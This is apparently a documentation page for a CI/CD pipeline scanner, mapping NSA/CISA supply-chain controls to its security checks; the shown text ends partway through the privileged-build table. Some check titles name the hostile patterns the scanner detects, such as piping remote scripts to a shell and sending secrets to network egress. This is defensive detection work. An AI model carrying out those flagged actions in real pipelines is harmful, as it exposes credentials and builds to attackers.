# NSA/CISA ESF. Securing the Software Supply Chain

- **Version:** 2022
- **URL:** <https://www.cisa.gov/sites/default/files/2023-08/ESF%20Securing%20the%20Software%20Supply%20Chain%20Recommended%20Practices%20for%20Software%20Bill%20of%20Materials%20Consumption.pdf>
- **Source of truth:** `pipeline_check/core/standards/data/esf_supply_chain.py`

NSA / CISA Enduring Security Framework, Securing the Software Supply
Chain. Three companion documents (developer, customer, supplier);
the scanner evidences controls that surface in CI/CD configuration.

## At a glance

- **Controls in this standard:** 24
- **Controls evidenced by at least one check:** 24 / 24
- **Distinct checks evidencing this standard:** 558
- **Of those, autofixable with `--fix`:** 111

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) | Harden the build environment (isolated, minimal, ephemeral workers) | 48 | 9C · 16H · 17M · 6L |
| [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) | Generate and preserve build audit logs | 5 | 1H · 2M · 2L |
| [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) | Enforce bounded build execution (single-use, time-limited) | 12 | 8M · 4L |
| [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) | Protect secrets used during build; no secrets in source or env | 44 | 25C · 16H · 2M · 1L |
| [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) | Avoid privileged / host-networked build workers | 41 | 6C · 20H · 14M · 1L |
| [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) | Sign build artifacts and verify signatures before release | 28 | 5H · 23M |
| [`ESF-D-SBOM`](#ctrl-esf-d-sbom) | Produce SBOM / provenance metadata with every build | 26 | 1H · 20M · 5L |
| [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) | Require peer review of source and pipeline configuration | 35 | 14H · 13M · 8L |
| [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) | Use short-lived, federated credentials (OIDC), not long-lived tokens | 27 | 1C · 18H · 8M |
| [`ESF-D-INJECTION`](#ctrl-esf-d-injection) | Prevent script / template injection from untrusted pipeline context | 71 | 20C · 44H · 6M · 1L |
| [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) | Protect build artifacts from tampering and detect unauthorized modification | 6 | 1C · 4M · 1L |
| [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) | Verify third-party and open-source dependencies before use | 98 | 15C · 47H · 32M · 4L |
| [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) | Pin dependencies / actions / images to immutable digests | 72 | 1C · 29H · 36M · 6L |
| [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) | Use only trusted, authenticated package and image registries | 25 | 1C · 18H · 5M · 1L |
| [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) | Scan inbound artifacts (images, packages) for known vulnerabilities | 21 | 3C · 1H · 14M · 3L |
| [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) | Enforce artifact / tag immutability to preserve provenance | 12 | 8H · 1M · 3L |
| [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) | Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts | 9 | 4H · 5M |
| [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) | Require explicit approval before production deployment | 22 | 8H · 13M · 1L |
| [`ESF-C-ROLLBACK`](#ctrl-esf-c-rollback) | Automated rollback on deployment failure or alarm | 4 | 2H · 2M |
| [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) | Monitor deployments with alarms / health checks | 5 | 3M · 2L |
| [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) | Separate deployment environments (dev / staging / prod) | 10 | 1H · 7M · 2L |
| [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) | Restrict access to artifact storage and deployment pipelines | 14 | 4C · 2H · 8M |
| [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) | Apply least-privilege to CI/CD service roles and pipelines | 29 | 4C · 13H · 12M |
| [`ESF-C-AUDIT`](#ctrl-esf-c-audit) | Audit deployment / pipeline activity and retain logs | 25 | 1H · 4M · 4L · 16I |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard esf_supply_chain`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard esf_supply_chain

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard esf_supply_chain

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard esf_supply_chain --standard owasp_cicd_top_10
```

## Controls in scope

### ESF-D-BUILD-ENV: Harden the build environment (isolated, minimal, ephemeral workers) { #ctrl-esf-d-build-env }

**Evidenced by 48 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, OCI manifest, Tekton, Terraform).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-013`](#detail-ado-013) | Self-hosted pool without explicit ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-017`](#detail-ado-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-004`](#detail-argo-004) | Argo workflow mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-013`](#detail-bb-013) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-016`](#detail-bb-016) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-020`](#detail-bb-020) | Full clone depth exposes complete history | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CB-002`](#detail-cb-002) | Privileged mode enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-004`](#detail-cb-004) | No build timeout configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-014`](#detail-cc-014) | Job missing `resource_class` declaration | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-017`](#detail-cc-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CF-003`](#detail-cf-003) | CloudFormation resource opens a 0.0.0.0/0 ingress | <span class="pg-sev pg-sev--high">HIGH</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`DF-011`](#detail-df-011) | Package manager install without cache cleanup in same layer | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-024`](#detail-df-024) | RUN npm/yarn/pnpm install runs lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-007`](#detail-dr-007) | Step mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-004`](#detail-ecr-004) | No lifecycle policy configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`GCB-010`](#detail-gcb-010) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-021`](#detail-gcb-021) | No private worker pool, build runs on the shared default pool | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-012`](#detail-gha-012) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-017`](#detail-gha-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-026`](#detail-gha-026) | Container job disables isolation via `options:` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-014`](#detail-gl-014) | Self-managed runner without ephemeral tag | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-017`](#detail-gl-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-003`](#detail-jf-003) | Pipeline uses `agent any` (no executor isolation) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-014`](#detail-jf-014) | Agent label missing ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-017`](#detail-jf-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-025`](#detail-jf-025) | Kubernetes agent pod template runs privileged or mounts hostPath | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-002`](#detail-k8s-002) | Pod hostNetwork: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-003`](#detail-k8s-003) | Pod hostPID: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-004`](#detail-k8s-004) | Pod hostIPC: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-015`](#detail-k8s-015) | Container missing resources.limits.memory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-016`](#detail-k8s-016) | Container missing resources.limits.cpu | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-022`](#detail-k8s-022) | Service exposes SSH (port 22) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-025`](#detail-k8s-025) | System priority class used outside kube-system | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-026`](#detail-k8s-026) | LoadBalancer Service has no loadBalancerSourceRanges | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-028`](#detail-k8s-028) | Container declares hostPort | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-030`](#detail-k8s-030) | Workload schedules onto a control-plane node | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-032`](#detail-k8s-032) | Namespace lacks default-deny NetworkPolicy | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-033`](#detail-k8s-033) | Namespace lacks ResourceQuota or LimitRange | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-038`](#detail-k8s-038) | NetworkPolicy ingress / egress allows all sources or destinations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-041`](#detail-k8s-041) | Service.externalIPs allows traffic interception (CVE-2020-8554) | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-043`](#detail-k8s-043) | Ingress rule has wildcard or missing host (catch-all) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`OCI-006`](#detail-oci-006) | Image has an excessive layer count | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`PBAC-001`](#detail-pbac-001) | CodeBuild project has no VPC configuration | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-003`](#detail-pbac-003) | CodeBuild security group allows 0.0.0.0/0 all-port egress | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TF-003`](#detail-tf-003) | CodeBuild VPC shares its VPC with a public subnet | <span class="pg-sev pg-sev--high">HIGH</span> | [Terraform](../providers/terraform.md) |  |
| [`TKN-004`](#detail-tkn-004) | Tekton Task mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-BUILD-LOGS: Generate and preserve build audit logs { #ctrl-esf-d-build-logs }

**Evidenced by 5 checks** across 4 providers (AWS, CircleCI, Cloud Build, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-011`](#detail-cc-011) | No store_test_results step (test results not archived) | <span class="pg-sev pg-sev--low">LOW</span> | [CircleCI](../providers/circleci.md) |  |
| [`GCB-006`](#detail-gcb-006) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-017`](#detail-gcb-017) | Image-producing build does not request SLSA provenance | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`JF-011`](#detail-jf-011) | Pipeline has no `buildDiscarder` retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### ESF-D-BUILD-TIMEOUT: Enforce bounded build execution (single-use, time-limited) { #ctrl-esf-d-build-timeout }

**Evidenced by 12 checks** across 11 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-015`](#detail-ado-015) | Job has no `timeoutInMinutes`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-007`](#detail-argo-007) | Argo workflow has no activeDeadlineSeconds | <span class="pg-sev pg-sev--low">LOW</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-005`](#detail-bb-005) | Step has no `max-time`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-006`](#detail-bk-006) | Step has no timeout_in_minutes | <span class="pg-sev pg-sev--low">LOW</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-004`](#detail-cb-004) | No build timeout configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CC-015`](#detail-cc-015) | No `no_output_timeout` configured | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-016`](#detail-gcb-016) | Step dir field contains parent-directory escape (..) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-015`](#detail-gha-015) | Job has no `timeout-minutes`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-015`](#detail-gl-015) | Job has no `timeout`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-015`](#detail-jf-015) | Pipeline has no `timeout` wrapper, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-006`](#detail-tkn-006) | Tekton run lacks an explicit timeout | <span class="pg-sev pg-sev--low">LOW</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-SECRETS: Protect secrets used during build; no secrets in source or env { #ctrl-esf-d-secrets }

**Evidenced by 44 checks** across 17 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM, Tekton, Terraform).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-003`](#detail-ado-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-008`](#detail-ado-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-006`](#detail-argo-006) | Literal secret value in Argo template env or parameter default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-003`](#detail-bb-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-008`](#detail-bb-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-017`](#detail-bb-017) | Repository token written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-019`](#detail-bb-019) | after-script references secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-002`](#detail-bk-002) | Literal secret value in pipeline env block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CB-001`](#detail-cb-001) | Secrets in plaintext environment variables | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-004`](#detail-cc-004) | Secret-like environment variable not managed via context | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-008`](#detail-cc-008) | Credential-shaped literal in config body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-019`](#detail-cc-019) | `add_ssh_keys` without fingerprint restriction | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CF-002`](#detail-cf-002) | CloudFormation parameter declares a default secret value | <span class="pg-sev pg-sev--high">HIGH</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-025`](#detail-df-025) | RUN writes a registry auth token into a Docker layer | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-004`](#detail-dr-004) | Literal credential in step environment / settings | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Drone CI](../providers/drone.md) |  |
| [`GCB-002`](#detail-gcb-002) | Cloud Build uses the default service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-003`](#detail-gcb-003) | Secret Manager value referenced in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-005`](#detail-gcb-005) | Build timeout unset or excessive | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-008`](#detail-gha-008) | Credential-shaped literal in workflow body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-019`](#detail-gha-019) | GITHUB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-033`](#detail-gha-033) | Secret value echoed / printed in a run: block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-034`](#detail-gha-034) | Reusable workflow called with secrets: inherit | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-039`](#detail-gha-039) | services / container credentials embedded as literal in workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-055`](#detail-gha-055) | Reusable workflow outputs derive a secret or caller-input value | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-057`](#detail-gha-057) | Secret-scanner output sent to network egress | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-008`](#detail-gl-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-020`](#detail-gl-020) | CI_JOB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-008`](#detail-jf-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-010`](#detail-jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-033`](#detail-jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-034`](#detail-jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-037`](#detail-k8s-037) | ConfigMap data carries a credential-shaped literal | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`LMB-003`](#detail-lmb-003) | Lambda function env vars may contain plaintext secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SSM-001`](#detail-ssm-001) | SSM Parameter with secret-like name is not a SecureString | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`TF-002`](#detail-tf-002) | Resource attribute carries a hard-coded secret shape | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |
| [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### ESF-D-PRIV-BUILD: Avoid privileged / host-networked build workers { #ctrl-esf-d-priv-build }

**Evidenced by 41 checks** across 14 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-013`](#detail-ado-013) | Self-hosted pool without explicit ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-002`](#detail-argo-002) | Argo template container runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-004`](#detail-argo-004) | Argo workflow mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-016`](#detail-bb-016) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-005`](#detail-bk-005) | Container started with --privileged or host-bind escalation | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CB-002`](#detail-cb-002) | Privileged mode enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-002`](#detail-df-002) | Container runs as root (missing or root USER directive) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-008`](#detail-df-008) | RUN invokes docker --privileged or escalates capabilities | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-012`](#detail-df-012) | RUN invokes sudo | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-013`](#detail-df-013) | EXPOSE declares sensitive remote-access port | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
